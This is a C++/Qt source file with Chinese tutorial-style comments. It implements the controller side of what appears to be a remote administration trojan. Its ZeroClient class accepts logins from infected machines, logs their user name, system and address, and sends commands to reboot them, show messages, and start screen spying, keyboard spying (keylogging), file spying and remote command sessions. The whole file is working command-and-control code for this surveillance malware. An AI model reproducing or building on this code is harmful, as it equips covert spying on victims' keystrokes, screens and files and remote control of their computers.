#include "zeroclient.h"

ZeroClient::ZeroClient(QTcpSocket *sock, QObject *parent) :
    QObject(parent), mId(-1)
{
    // 设置socket
    mSock = new TcpSocket(sock, this);
    connect(mSock, SIGNAL(newData()), this, SLOT(newData()));
    connect(mSock, SIGNAL(disconnected()), this, SLOT(disconnected()));

    // 设置计时器来判断客户是否登入，如果没就断开连接
    // 我在这里设置10秒钟，很随意的，你想怎么设置都可以
    mLoginTimeout = new QTimer(this);
    connect(mLoginTimeout, SIGNAL(timeout()), this, SLOT(clientLoginTimeout()));
    mLoginTimeout->start(10*1000);
}

void ZeroClient::closeAndDelete()
{
    // 输出信息
    qDebug() << mSock->socket()->peerAddress().toString() << ":"
             << mSock->socket()->peerPort() << " 已经断开服务端";

    mSock->close();
    deleteLater();
}

void ZeroClient::sendMessage(QString &text)
{
    QString data;
    data.append(CmdSendMessage+CmdSplit);
    data.append("TEXT"+CmdSplit+text);
    data.append(CmdEnd);
    mSock->write(data.toLocal8Bit());
}

void ZeroClient::sendReboot()
{
    QString data;
    data.append(CmdReboot+CmdSplit);
    data.append(CmdEnd);
    mSock->write(data.toLocal8Bit());
}

void ZeroClient::sendQuit()
{
    QString data;
    data.append(CmdQuit+CmdSplit);
    data.append(CmdEnd);
    mSock->write(data.toLocal8Bit());
}

void ZeroClient::sendScreenSpy(int port)
{
    QString data;
    data.append(CmdScreenSpy+CmdSplit);
    data.append("PORT"+CmdSplit+QString::number(port));
    data.append(CmdEnd);
    mSock->write(data.toLocal8Bit());
}

void ZeroClient::sendKeyboardSpy(int port)
{
    QString data;
    data.append(CmdKeyboardSpy+CmdSplit);
    data.append("PORT"+CmdSplit+QString::number(port));
    data.append(CmdEnd);
    mSock->write(data.toLocal8Bit());
}

void ZeroClient::sendFileSpy(int port)
{
    QString data;
    data.append(CmdFileSpy+CmdSplit);
    data.append("PORT"+CmdSplit+QString::number(port));
    data.append(CmdEnd);
    mSock->write(data.toLocal8Bit());
}

void ZeroClient::sendCmdSpy(int port)
{
    QString data;
    data.append(CmdCmdSpy+CmdSplit);
    data.append("PORT"+CmdSplit+QString::number(port));
    data.append(CmdEnd);
    mSock->write(data.toLocal8Bit());
}

void ZeroClient::processCommand(QByteArray &cmd, QByteArray &args)
{
    cmd = cmd.toUpper().trimmed();
    QHash<QByteArray, QByteArray> hashArgs = parseArgs(args);

    // 登入指令
    if (cmd == CmdLogin && mId == -1) {
        doLogin(hashArgs);
        return;
    }
}

QHash<QByteArray, QByteArray> ZeroClient::parseArgs(QByteArray &args)
{
    QList<QByteArray> listArgs = args.split(CmdSplit[0]);

    // 分解参数，然后把它加入哈希表
    QHash<QByteArray, QByteArray> hashArgs;
    for(int i=0; i<listArgs.length()-1 ; i+=2) {
        hashArgs.insert(listArgs[i].toUpper().trimmed(),
                        listArgs[i+1].trimmed());
    }

    return hashArgs;
}

void ZeroClient::doLogin(QHash<QByteArray, QByteArray> &args)
{
    // 发射登录信号
    QString userName = args["USER_NAME"];
    QString system = args["SYSTEM"];
    QString ip = mSock->socket()->peerAddress().toString();
    int port = mSock->socket()->peerPort();
    emit login(this, userName, ip, port, system);

    // 输出信息
    qDebug() << ip << ":" << port << " 已经登入服务端";
}

void ZeroClient::clientLoginTimeout()
{
    if (mId == -1) {
        closeAndDelete();
    }
}

void ZeroClient::disconnected()
{
    if (mId >= 0) {
        emit logout(mId);
    }

    closeAndDelete();
}

void ZeroClient::newData()
{
    // 从socket里获取缓存区
    QByteArray *buf = mSock->buffer();

    int endIndex;
    while ((endIndex = buf->indexOf(CmdEnd)) > -1) {
        // 提取一行指令
        QByteArray data = buf->mid(0, endIndex);
        buf->remove(0, endIndex + CmdEnd.length());

        // 提取指令和参数
        QByteArray cmd, args;
        int argIndex = data.indexOf(CmdSplit);
        if (argIndex == -1) {
            cmd = data;
        } else {
            cmd = data.mid(0, argIndex);
            args = data.mid(argIndex+CmdSplit.length(), data.length());
        }

        // 处理指令
        processCommand(cmd, args);
    }
}
